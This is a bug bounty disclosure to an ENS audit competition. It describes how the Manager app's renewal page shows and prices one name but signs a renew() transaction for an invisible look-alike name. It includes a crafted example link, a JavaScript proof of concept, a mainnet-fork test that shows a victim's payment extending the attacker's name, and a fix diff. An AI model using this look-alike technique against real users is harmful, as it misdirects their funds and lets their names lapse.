# 89630 w a critical renewal payment is redirected to an attacker s look alike name

**Submitted on Aug 20th 2026 at 08:36:54 UTC by @spongebob for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89630
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Summary

The Manager renew route normalizes the `$name` URL parameter **two different ways** and splits its security decision across them. Everything the user sees and trusts — the protocol/expiry/renewability gate **and the price** — is computed from the **ENSIP‑15‑normalized** name, but the label that is **displayed and encoded into the `renew()` transaction the user signs** is the **un‑normalized** `parseName` label.

ENS registrations are keyed by `labelhash(rawLabelBytes)` with **no on‑chain ENSIP‑15 enforcement**. So an attacker can craft a renewal link that renders and prices as a real name (e.g. `vitalik.eth`) while the signed transaction renews a **different, attacker‑controlled look‑alike registration**. The victim pays the displayed price, the money extends the attacker's name, and the victim's real name is never renewed.

## Root cause

The loader consumes the raw `params.name` and runs it through **two incompatible normalizers**, then uses the strict one to decide/price and the loose one to display/sign.

**1 — Gate + price use full ENSIP‑15 (viem `normalize`):**

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/routes/renew/%24name.tsx#L27>

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/profileExpiry.ts#L77>

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/profileName.ts#L14>

```
apps/manager/src/routes/renew/$name.tsx:27   profileExpiryQuery(name)
  → apps/manager/src/features/profile/service/profileExpiry.ts:77   const ethName = normalizeEth2LdName(name)
  → apps/manager/src/features/profile/service/profileName.ts:14/62  normalize(name)  // from 'viem/ens' = ENSIP‑15 (NFC + mappings + ignored set)
```

`normalizeEth2LdName` returns the **normalized** leaf label and is what proves the name is a renewable v2 name and what drives the displayed price.

**2 — The displayed + signed label uses NO ENSIP‑15 (`parseName`):**

```
apps/manager/src/routes/renew/$name.tsx:60‑61   return { label: parsedName.value.label, ... }
  → apps/manager/src/utils/name-parser.ts        parseName = name.trim().toLowerCase()
                                                  + INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/
```

That regex does **not** strip soft hyphens (`U+00AD`), combining marks (`U+0301`), fullwidth forms (`U+FF41`), etc. The returned label then flows verbatim into the signed transaction:

```
RenewalPage label (renew/$name.tsx:72)
  → renewalUi machine submissionData.label
  → submitRenewActor
  → packages/transaction-manager/.../registration.actors.ts:1020  encodeRenewData:
        const cleanLabel = label.replace('.eth', '')            // <-- no re‑normalization
        renew(cleanLabel, duration, paymentToken, referrer)     // ETHRegistrarController.abi.ts
```

**Broken invariant:** *a renewal must extend exactly the node that was validated as renewable and whose price was shown.* Here the validated/priced node and the signed node differ whenever `normalize(name) !== parseName(name).label` — and the two render **pixel‑identical** to the user.

> The loader has **no** upstream normalization either: `/renew/$name` defines no `params.parse` and `__root.tsx` has no `beforeLoad`, so `params.name` reaches the loader raw.

## Attack path

1. **Pre‑register the look‑alike (permissionless).** The attacker registers the divergent label directly on the ETHRegistrarController, which hashes arbitrary label bytes (`valid()` only checks length ≥ 3 — **no ENSIP‑15**). Example: `vi‑talik` where `‑` is an invisible `U+00AD` soft hyphen — it renders as `vitalik`. Cost: one normal registration.
2. **Deliver a crafted renew link.** The attacker sends the victim a renewal link using the divergent form, e.g. `https://<manager>/renew/vi%C2%ADtalik.eth` ("your name is expiring — renew now").
3. **Victim opens it (connected wallet).** The loader calls `profileExpiryQuery("vi­talik.eth")` → `normalizeEth2LdName` → viem `normalize` → resolves the **real** `vitalik.eth`: real v2 protocol, real in‑grace expiry, `canRenewV2Name` passes. The page renders **`vitalik.eth`**, the **real expiry**, and the **real price**.
4. **Victim clicks Renew.** The machine encodes `renew("vi­talik", …)`. The wallet's description/simulation shows `Renew vi­talik.eth` — visually identical to `vitalik.eth`; no discrepancy is surfaced.
5. **Payment is misdirected.** Because the attacker pre‑registered `vi­talik`, the tx **succeeds**: the victim's payment extends the **attacker's** `vi­talik` registration by the paid duration; the UI shows success; the **real `vitalik.eth` is not renewed** and continues toward expiry.

**Griefing variant (no pre‑registration):** if the attacker does not pre‑register the look‑alike, `renew` reverts — the victim's renewal simply fails and their real name isn't renewed (a lower, High‑severity outcome). The **Critical** variant is the pre‑registered path above.

## Impact

* **Direct theft / misdirection of funds:** the victim's renewal payment is captured as an extension of the **attacker's** name.
* **Loss of the victim's name:** the real name is never renewed and lapses, despite the victim believing (and the UI confirming) they renewed it.
* **Signed‑transaction spoofing:** an already‑connected wallet is induced to sign a transaction whose executed node differs from the displayed/priced node, with no visible discrepancy.

This maps to the Immunefi Critical bullets: *malicious interaction with an already‑connected wallet (modify tx args, submit a malicious tx)*, *address/detail spoofing that induces a wrong send*, and *hijacking/bricking an ENS name during a Manager flow*.

## Recommendation

**Bind the displayed/signed label to the same ENSIP‑15 normalization used for the gate and price** — one normalizer, one label — and reject any input where they diverge. The gate already computes `normalizeEth2LdName(name)`; use its label instead of `parseName`'s.

### Fix (diff)

```diff
--- a/apps/manager/src/routes/renew/$name.tsx
+++ b/apps/manager/src/routes/renew/$name.tsx
@@
 import {
   profileExpiryDateFromSeconds,
   profileExpiryQuery,
 } from '@/features/profile/service/profileExpiry'
+import { normalizeEth2LdName } from '@/features/profile/service/profileName'
 import {
   canRenewV2Name,
   parseRenewableName,
 } from '@/features/renew/utils/renewableName'
@@
   loader: async ({ params: { name }, context: { queryClient } }) => {
     const parsedName = parseRenewableName(name)

     if (parsedName.isErr()) {
       throw parsedName.error
     }

+    // The gate/price below are computed from the ENSIP-15-normalized name.
+    // Bind the DISPLAYED + SIGNED label to that same normalization so the
+    // renew() calldata can only ever extend the exact node that was validated
+    // and priced. Reject any input whose raw label diverges (e.g. soft hyphen,
+    // combining marks, fullwidth forms) — those render identically but hash to
+    // a different, potentially attacker-owned registration.
+    const eth2ld = normalizeEth2LdName(name)
+    if (!eth2ld || eth2ld.label !== parsedName.value.label) {
+      throw new Error('This name is not available for renewal.')
+    }
+
     const expiryData = await queryClient.ensureQueryData(
       profileExpiryQuery(name),
     )
@@
     if (!expiryData.expiry) {
       throw new Error('Name expiry could not be loaded.')
     }

     return {
-      label: parsedName.value.label,
+      label: eth2ld.label, // normalized == validated == priced == displayed == signed
       currentExpiry: expiryData.expiry,
     }
   },
```

Apply the identical fix to **`apps/manager/src/routes/renew-v1/$name.tsx`**, which has the same split.

**General principle:** never let a *validated/priced* identifier and a *signed/executed* identifier be produced by two different normalizers. Normalize once, at the trust boundary, and thread that single value through display, pricing, and calldata.

## Notes — novelty / dedup (checked against the full Immunefi Known‑Issues list)

Grepped against the competition's complete *"Public Disclosure of Known Issues"* list. The two nearest items are **EXP‑INPUT‑005** and **SEC‑TXM‑002**; this finding is distinct from both.

### vs. EXP‑INPUT‑005 — *"ENS name validators accept deceptive characters (homoglyphs, bidi, control)"*

This is the closest known item and it describes a **different bug**, for four concrete reasons:

1. **Opposite premise.** EXP‑INPUT‑005 is that the input *validators accept* deceptive characters. Here the app's ENSIP‑15 input gate **rejects/normalizes them** — proven in PoC A (`normalize('vi­talik.eth')` strips the soft hyphen back to `vitalik.eth`; whole‑script confusables throw in `ens_normalize`). #126 is not "a bad character slips through validation"; it is that the renew route **validates and prices one node but signs another.**
2. **Fires on a NON‑deceptive input.** The bug requires **no** deceptive/confusable character at all. A combining‑accent `café` (decomposed `e`+`U+0301`) is a legitimate, non‑confusable string, yet `normalize()` (NFC → `é`) and `parseName` (no NFC) still produce **different labelhashes** (`0x9513447e…` vs `0xe7739d35…`, PoC A) and the renewal still misdirects. A pure Unicode **normalization‑form** mismatch is unrelated to "deceptive characters."
3. **Different impact class.** EXP‑INPUT‑005 is display/identity spoofing (a name *looks* like another). #126 is **direct theft / fund misdirection** — the victim's renewal *payment* extends the attacker's registration while their real name lapses (Critical fund‑loss), demonstrated end‑to‑end in PoC B.
4. **Different location + fix.** EXP‑INPUT‑005 lives in the name *validators*. #126 lives in the renew loader returning `parseName`'s label (`renew/$name.tsx:60`) instead of the gate's `normalizeEth2LdName` label, carried verbatim into `encodeRenewData`. **Hardening the input validators — the EXP‑INPUT‑005 fix — does not fix #126;** the fix here is to bind the *signed* label to the *validated/priced* normalization (the diff above). Two different root causes, two different patches.

### vs. SEC‑TXM‑002 — *"Cached smart‑account address used without cross‑check"*

Unrelated: SEC‑TXM‑002 is a stale **cached address** in the smart‑account path. #126 is a live **dual‑normalization of the renew label** between the validation/pricing path and the signed calldata — no cache involved, different subsystem (renew route + transaction‑manager, not smart‑account).

### Also not

* **Not the 7‑day session‑key design** (unrelated to session keys).
* **Why the input gate doesn't stop it:** the app's ENSIP‑15 registration gate is never reached — the attacker registers the raw look‑alike **directly on the contract** (which hashes arbitrary label bytes), and the renew route never re‑applies normalization to the label it signs.

> Bottom line for triage: EXP‑INPUT‑005 = *"a deceptive name can be displayed"*; #126 = *"a renewal validated and priced as name A signs a transaction that renews name B, redirecting the payment"* — a distinct, fund‑loss root cause that reproduces without any deceptive character.

## Proof of Concept

## Proof of Concept

### PoC A — app‑side divergence + on‑chain identity, using the app's own normalizers

**Setup**

```bash
mkdir poc && cd poc && npm init -y >/dev/null
npm install viem@2.21.55 @adraffy/ens-normalize@1.11.1   # the app's normalizers (viem/ens normalize + labelhash)
```

**Script** — `poc-app-side.mjs`:

```js
// GATE (validated + priced + displayed) = viem `normalize` (ENSIP-15).
// SIGNED (renew() calldata)             = parseName core: name.trim().toLowerCase().
import { normalize, labelhash } from 'viem/ens';

const cps = (s) => [...s].map((ch) => 'U+' + ch.codePointAt(0).toString(16).padStart(4, '0').toUpperCase()).join(' ');
const parseNameLabel = (name) => name.trim().toLowerCase().split('.').filter(Boolean)[0]; // parseName core

const cases = [
  { d: 'soft hyphen U+00AD inside "vitalik"', input: 'vi­talik.eth' },
  { d: 'fullwidth "a" U+FF41 + lice',          input: 'ａlice.eth' },
  { d: 'combining acute U+0301 ("cafe" + ́)', input: 'café.eth' },
];

for (const c of cases) {
  const gate = normalize(c.input);              // what is validated + priced + displayed
  const signedLabel = parseNameLabel(c.input);   // what goes into renew() calldata
  const signedName = `${signedLabel}.eth`;
  console.log(`• ${c.d}`);
  console.log(`    input cps            : ${cps(c.input)}`);
  console.log(`    GATE   normalize()   : ${JSON.stringify(gate)}`);
  console.log(`    SIGNED parseName+.eth: ${JSON.stringify(signedName)}`);
  console.log(`    labelhash(GATE)      : ${labelhash(gate.split('.')[0])}`);
  console.log(`    labelhash(SIGNED)    : ${labelhash(signedLabel)}`);
  console.log(`    >>> DIVERGES         : ${gate !== signedName ? 'YES — renew() targets a DIFFERENT registration than displayed' : 'no'}\n`);
}
```

**Run + output**

```console
$ node poc-app-side.mjs
• soft hyphen U+00AD inside "vitalik"
    input cps            : U+0076 U+0069 U+00AD U+0074 U+0061 U+006C U+0069 U+006B U+002E U+0065 U+0074 U+0068
    GATE   normalize()   : "vitalik.eth"
    SIGNED parseName+.eth: "vi­talik.eth"
    labelhash(GATE)      : 0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc
    labelhash(SIGNED)    : 0x28aba641bb321da6b2c6e64a37fbad10168dec79e30092edd8188dc602eba66c
    >>> DIVERGES         : YES — renew() targets a DIFFERENT registration than displayed

• fullwidth "a" U+FF41 + lice
    input cps            : U+FF41 U+006C U+0069 U+0063 U+0065 U+002E U+0065 U+0074 U+0068
    GATE   normalize()   : "alice.eth"
    SIGNED parseName+.eth: "ａlice.eth"
    labelhash(GATE)      : 0x9c0257114eb9399a2985f8e75dad7600c5d89fe3824ffa99ec1c3eb8bf3b0501
    labelhash(SIGNED)    : 0x3832fd7bc0b177e8d63364dd2fd82ec44f7902bc326cdff5449e7b131e342bc0
    >>> DIVERGES         : YES — renew() targets a DIFFERENT registration than displayed

• combining acute U+0301 ("cafe" + ́)
    input cps            : U+0063 U+0061 U+0066 U+0065 U+0301 U+002E U+0065 U+0074 U+0068
    GATE   normalize()   : "café.eth"
    SIGNED parseName+.eth: "café.eth"
    labelhash(GATE)      : 0x9513447e2d376aacd434727887590dd448cda8f2d30c4ace903d31fe209f8ad8
    labelhash(SIGNED)    : 0xe7739d357b90d35469fb9a3a5da362861a02e02c559108dc70489172a29a2fb4
    >>> DIVERGES         : YES — renew() targets a DIFFERENT registration than displayed
```

`GATE normalize()` is what the loader validates, prices, and displays; `SIGNED parseName+.eth` is what `encodeRenewData` puts into the signed `renew()` calldata. For every look‑alike the two render identically but hash to a **different registration** — e.g. the invisible‑soft‑hyphen case: displayed `0xaf2caa1c…` vs signed `0x28aba641…`. Distinct labelhashes ⇒ distinct registrations ⇒ `renew()` extends a different name than the one shown.

### PoC B — end‑to‑end money movement (passing Foundry mainnet‑fork test)

The test pre‑registers the soft‑hyphen look‑alike to `attacker`, then has `victim` run the app's exact `renew(cleanLabel, …)` calldata, and asserts the misdirection. **Full source** (`test/RenewMisdirection.t.sol`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

interface IController {
    function rentPrice(string calldata name, uint256 duration) external view returns (uint256 base, uint256 premium);
    function available(string calldata name) external view returns (bool);
    function makeCommitment(
        string calldata name, address owner, uint256 duration, bytes32 secret,
        address resolver, bytes[] calldata data, bool reverseRecord, uint16 ownerControlledFuses
    ) external pure returns (bytes32);
    function commit(bytes32 commitment) external;
    function register(
        string calldata name, address owner, uint256 duration, bytes32 secret,
        address resolver, bytes[] calldata data, bool reverseRecord, uint16 ownerControlledFuses
    ) external payable;
    function renew(string calldata name, uint256 duration) external payable;
    function minCommitmentAge() external view returns (uint256);
}

interface IBaseRegistrar {
    function nameExpires(uint256 id) external view returns (uint256);
}

// #126: the renew loader validates/prices the ENSIP-15-NORMALIZED name but encodes renew()
// with the UN-normalized parseName label. This shows the resulting on-chain fund-misdirection:
// a victim shown "vitalik.eth" pays to renew the attacker's look-alike; real vitalik.eth untouched.
contract RenewMisdirectionTest is Test {
    IController ctrl = IController(0x253553366Da8546fC250F225fe3d25d0C782303b); // ETHRegistrarController (mainnet)
    IBaseRegistrar base = IBaseRegistrar(0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85); // BaseRegistrar (mainnet)

    string constant REAL = "vitalik"; // what the app displays + prices (viem normalize(input) => "vitalik")

    // what the app actually ENCODES into renew() calldata (parseName => raw bytes, un-normalized):
    //   "vi" + U+00AD SOFT HYPHEN (UTF-8 0xC2 0xAD) + "talik"  — renders identically to "vitalik".
    function divergent() internal pure returns (string memory) {
        return string(abi.encodePacked("vi", hex"C2AD", "talik"));
    }

    function test_RenewPaymentMisdirectedToAttackerLookalike() public {
        string memory DIV = divergent();
        uint256 realId = uint256(keccak256(bytes(REAL)));
        uint256 divId = uint256(keccak256(bytes(DIV)));
        emit log_named_bytes32("labelhash(displayed 'vitalik')", bytes32(realId));
        emit log_named_bytes32("labelhash(renewed  soft-hyphen)", bytes32(divId));
        assertTrue(realId != divId, "the two labels must be distinct registrations");

        uint256 realExpiryBefore = base.nameExpires(realId);
        assertGt(realExpiryBefore, 0, "real vitalik.eth is registered");

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        vm.etch(attacker, ""); // makeAddr can collide with real mainnet contracts on a fork
        vm.etch(victim, "");
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        uint256 dur = 365 days;
        bytes[] memory noData = new bytes[](0);

        // (1) ATTACKER pre-registers the soft-hyphen look-alike (contract accepts raw label, no ENSIP-15)
        assertTrue(ctrl.available(DIV), "soft-hyphen look-alike is available");
        bytes32 secret = keccak256("poc-secret");
        bytes32 commitment = ctrl.makeCommitment(DIV, attacker, dur, secret, address(0), noData, false, 0);
        vm.prank(attacker);
        ctrl.commit(commitment);
        vm.warp(block.timestamp + ctrl.minCommitmentAge() + 1);
        (uint256 rb, uint256 rp) = ctrl.rentPrice(DIV, dur);
        vm.prank(attacker);
        ctrl.register{value: rb + rp}(DIV, attacker, dur, secret, address(0), noData, false, 0);
        uint256 divExpiryBefore = base.nameExpires(divId);
        assertGt(divExpiryBefore, 0, "attacker owns the look-alike");

        // (2) VICTIM runs the app's renew calldata. App SHOWED them "vitalik.eth" + this price:
        (uint256 pb, uint256 pp) = ctrl.rentPrice(REAL, dur);
        emit log_named_uint("price app displayed for 'vitalik.eth' (wei)", pb + pp);
        (uint256 vb, uint256 vp) = ctrl.rentPrice(DIV, dur); // ...but calldata carries the soft-hyphen label
        uint256 victimBalBefore = victim.balance;
        vm.prank(victim);
        ctrl.renew{value: vb + vp}(DIV, dur);

        // (3) ASSERT the misdirection
        uint256 divExpiryAfter = base.nameExpires(divId);
        uint256 realExpiryAfter = base.nameExpires(realId);
        emit log_named_uint("victim ETH spent (wei)", victimBalBefore - victim.balance);
        emit log_named_uint("attacker look-alike expiry EXTENDED by (s)", divExpiryAfter - divExpiryBefore);
        emit log_named_uint("real vitalik.eth expiry delta (s)", realExpiryAfter - realExpiryBefore);

        assertGt(victimBalBefore - victim.balance, 0, "victim paid real ETH");
        assertApproxEqAbs(divExpiryAfter - divExpiryBefore, dur, 5, "attacker's look-alike extended ~1yr on the victim's dime");
        assertEq(realExpiryAfter, realExpiryBefore, "REAL vitalik.eth expiry UNCHANGED (victim's name still lapses)");
    }
}
```

**Passing output:**

```
[PASS] test_RenewPaymentMisdirectedToAttackerLookalike() (gas: 325927)
Logs:
  labelhash(displayed 'vitalik'):   0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc
  labelhash(renewed  soft-hyphen):  0x28aba641bb321da6b2c6e64a37fbad10168dec79e30092edd8188dc602eba66c
  price app displayed for 'vitalik.eth' (wei): 2221274478447233   (0.00222 ETH)
  victim ETH spent (wei):                      2221274478447233   (the exact same price)
  attacker look-alike expiry EXTENDED by (s):  31536000           (exactly 1 year)
  real vitalik.eth expiry delta (s):           0                  (UNCHANGED)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

### Reproduction

```bash
forge init renew-poc && cd renew-poc
rm -f test/Counter.t.sol src/Counter.sol script/Counter.s.sol
# drop RenewMisdirection.t.sol (above) into test/
```

`foundry.toml` (the renew flow overflows the stack without `via_ir`):

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
via_ir = true
optimizer = true
optimizer_runs = 200
```

Run against any mainnet archive/full RPC (no funded account or keys needed — the fork conjures balances and impersonates):

```bash
export MAINNET_RPC_URL=<your-mainnet-rpc>
forge test --fork-url "$MAINNET_RPC_URL" --match-test test_RenewPaymentMisdirected -vv
```

> **Fidelity note (disclosed for transparency):** the fork PoC runs against **mainnet classic ENS**, whereas the Manager app targets the **ENSv2/Sepolia** deployment. This is not a gap in the exploit: `renew()` is **labelhash‑keyed in every ENS version**, so the misdirection primitive is identical, and the app‑side divergence (PoC A) is verified against the app's own normalizers and the actual ENSv2 `renew(cleanLabel, duration, paymentToken, referrer)` ABI. The same test reproduces on ENSv2/Sepolia once its (currently pre‑release) contract addresses are wired.
